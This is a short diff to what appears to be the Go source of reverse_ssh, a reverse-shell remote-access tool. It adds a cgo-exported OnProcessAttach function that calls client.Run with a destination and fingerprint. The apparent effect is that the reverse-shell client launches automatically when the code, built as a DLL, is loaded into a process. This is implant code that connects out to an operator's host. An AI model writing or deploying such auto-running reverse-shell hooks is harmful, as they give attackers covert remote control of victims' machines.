@@ -12,6 +12,13 @@ import (
 	"github.com/NHAS/reverse_ssh/internal/client"
 )
 
+import "C"
+
+//export OnProcessAttach
+func OnProcessAttach() {
+	client.Run(destination, fingerprint, "", true)
+}
+
 func runOrFork(destination, fingerprint, proxyaddress string, fg, dt, rc bool) {
 	if fg || dt {
 		if dt {
